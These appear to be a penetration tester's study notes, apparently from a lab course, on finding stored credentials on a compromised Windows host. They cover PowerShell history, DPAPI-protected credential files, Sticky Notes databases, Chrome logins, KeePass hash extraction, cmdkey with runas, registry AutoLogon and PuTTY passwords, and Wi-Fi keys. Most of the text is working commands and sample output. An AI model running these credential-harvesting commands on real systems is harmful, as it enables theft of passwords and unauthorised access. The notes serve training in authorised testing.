# Windows Credential Hunting

### Application Configuration Files

```powershell-session
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

### Dictionary Files

**Chrome Dictionary Files**

```powershell-session
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

### Unattended Installation Files

* Unattended installation files may define auto-logon settings or additional accounts to be created as part of the installation.
* Passwords in the `unattend.xml` are stored in plaintext or base64 encoded.

```xml
<?xml version="1.0" encoding="utf-8"?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">
    <settings pass="specialize">
        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <AutoLogon>
                <Password>
                    <Value>local_4dmin_p@ss</Value>
                    <PlainText>true</PlainText>
                </Password>
                <Enabled>true</Enabled>
                <LogonCount>2</LogonCount>
                <Username>Administrator</Username>
            </AutoLogon>
            <ComputerName>*</ComputerName>
        </component>
    </settings>
```

* Although these files should be automatically deleted as part of the installation, sysadmins may have created copies of the file in other folders during the development of the image and answer file.

### PowerShell History File

```
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

**Confirming PowerShell History Save Path**

```powershell-session
(Get-PSReadLineOption).HistorySavePath
```

**Reading PowerShell History File**

```powershell-session
gc (Get-PSReadLineOption).HistorySavePath
```

```powershell-session
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

* We can also use this one-liner to retrieve the contents of all Powershell history files that we can access as our current user.

### PowerShell Credentials

* PowerShell credentials are often used for scripting and automation tasks as a way to store encrypted credentials conveniently.
* The credentials are protected using [DPAPI](https://en.wikipedia.org/wiki/Data\_Protection\_API), which typically means they can only be decrypted by the same user on the same computer they were created on.
* Take, for example, the following script `Connect-VC.ps1`, which a sysadmin has created to connect to a vCenter server easily.

```powershell
# Connect-VC.ps1
# Get-Credential | Export-Clixml -Path 'C:\scripts\pass.xml'
$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $decryptedPassword
```

**Decrypting PowerShell Credentials**

* If we have gained command execution in the context of this user or can abuse DPAPI, then we can recover the cleartext credentials from `encrypted.xml`.
  * The example below assumes the former.

```powershell-session
 $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
```

```powershell-session
$credential.GetNetworkCredential().username
```

```powershell-session
$credential.GetNetworkCredential().password
```

### Manually Searching the File System for Credentials

```cmd-session
findstr /spin "password" *.*
```

**Search File Contents with PowerShell**

```powershell-session
select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password
```

**Search for File Extensions - Example 1**

```cmd-session
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
```

**Search for File Extensions - Example 2**

```cmd-session
where /R C:\ *.config
```

**Search for File Extensions Using PowerShell**

```powershell-session
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```

### Sticky Notes Passwords

* located here

```
C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
```

* We can copy the three `plum.sqlite*` files down to our system and open them with a tool such as [DB Browser for SQLite](https://sqlitebrowser.org/dl/) and view the `Text` column in the `Note` table with the query `select Text from Note;`.

!\[\[Pasted image 20240807175846.png]]

**Viewing Sticky Notes Data Using PowerShell**

```powershell-session
Set-ExecutionPolicy Bypass -Scope Process
```

```powershell-session
Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A
```

```powershell-session
cd .\PSSQLite\
```

```powershell-session
Import-Module .\PSSQLite.psd1
```

```powershell-session
$db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
```

```powershell-session
Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
```

**Strings to View DB File Contents**

* We can also copy them over to our attack box and search through the data using the `strings` command, which may be less efficient depending on the size of the database.

### Other Files of Interest

**Other Interesting Files**

* Some other files we may find credentials in include the following:
*

```shell-session
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
```

### Further Credential Theft

#### Cmdkey Saved Credentials

* The [cmdkey](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey) command can be used to create, list, and delete stored usernames and passwords.
* Users may wish to store credentials for a specific host or use it to store credentials for terminal services connections to connect to a remote host using Remote Desktop without needing to enter a password.
* This may help us either move laterally to another system with a different user or escalate privileges on the current host to leverage stored credentials for another user.

```cmd-session
cmdkey /list
```

* We can also attempt to reuse the credentials using `runas` to send ourselves a reverse shell as that user, run a binary, or launch a PowerShell or CMD console with a command such as:

**Run Commands as Another User**

```powershell-session
runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```

### Browser Credentials

**Retrieving Saved Credentials from Chrome**

* Users often store credentials in their browsers for applications that they frequently visit.
  * We can use a tool such as [SharpChrome](https://github.com/GhostPack/SharpDPAPI) to retrieve cookies and saved logins from Google Chrome.

```powershell-session
.\SharpChrome.exe logins /unprotect
```

### Password Managers

**Extracting KeePass Hash**

```shell-session
python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx 
```

**Cracking Hash Offline**

* \[\[Online Hash Crackers]]
* \[\[Hashcat]]

### Email

* If we gain access to a domain-joined system in the context of a domain user with a Microsoft Exchange inbox,
  * we can attempt to search the user's email for terms such as "pass," "creds," "credentials," etc. using the tool [MailSniper](https://github.com/dafthack/MailSniper).

### When all else fails

* &#x20;run the \[\[laZagne]] tool in an attempt to retrieve credentials from a wide variety of software
* \[\[SessionGopher]]

### Clear-Text Password Storage in the Registry

#### Windows AutoLogon

* Windows [Autologon](https://learn.microsoft.com/en-us/troubleshoot/windows-server/user-profiles-and-logon/turn-on-automatic-logon) is a feature that allows a user to configure their Windows operating system to automatically log on to a specific user account, without requiring manual input of the username and password at each startup.
* However, once this is configured, the username and password are stored in the registry, in clear-text.
  * This feature is commonly used on single-user systems or in situations where convenience outweighs the need for enhanced security
* The registry keys associated with Autologon can be found under `HKEY_LOCAL_MACHINE` in the following hive, and can be accessed by standard users:

```cmd
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```

* The typical configuration of an Autologon account involves the manual setting of the following registry keys:
  * `AdminAutoLogon` - Determines whether Autologon is enabled or disabled. A value of "1" means it is enabled.
  * `DefaultUserName` - Holds the value of the username of the account that will automatically log on.
  * `DefaultPassword` - Holds the value of the password for the user account specified previously.

**Enumerating Autologon with reg.exe**

```cmd-session
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

```cmd-session

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    
    <SNIP>
    
    AutoAdminLogon    REG_SZ    1
    DefaultUserName    REG_SZ    htb-student
    DefaultPassword    REG_SZ    HTB_@cademy_stdnt!
```

* **`Note:`** If you absolutely must configure Autologon for your windows system, it is recommended to use Autologon.exe from the Sysinternals suite, which will encrypt the password as an LSA secret.

#### Putty

* For Putty sessions utilizing a proxy connection, when the session is saved, the credentials are stored in the registry in clear text.

```
Computer\HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION NAME>
```

* Note that the access controls for this specific registry key are tied to the user account that configured and saved the session.
* Therefore, in order to see it, we would need to be logged in as that user and search the `HKEY_CURRENT_USER` hive.
* Subsequently, if we had admin privileges, we would be able to find it under the corresponding user's hive in `HKEY_USERS`.

**Enumerating Sessions and Finding Credentials:**

```powershell-session
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
```

```powershell-session
HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```

* Next, we look at the keys and values of the discovered session "`kali%20ssh`":

```powershell-session
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```

```powershell-session
HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
    Present    REG_DWORD    0x1
    HostName    REG_SZ
    LogFileName    REG_SZ    putty.log
    
  <SNIP>
  
    ProxyDNS    REG_DWORD    0x1
    ProxyLocalhost    REG_DWORD    0x0
    ProxyMethod    REG_DWORD    0x5
    ProxyHost    REG_SZ    proxy
    ProxyPort    REG_DWORD    0x50
    ProxyUsername    REG_SZ    administrator
    ProxyPassword    REG_SZ    1_4m_th3_@cademy_4dm1n!  
```

### Wifi Passwords

**Viewing Saved Wireless Networks**

```cmd-session
netsh wlan show profile
```

**Retrieving Saved Wireless Passwords**

```cmd-session
netsh wlan show profile ilfreight_corp key=clear
```
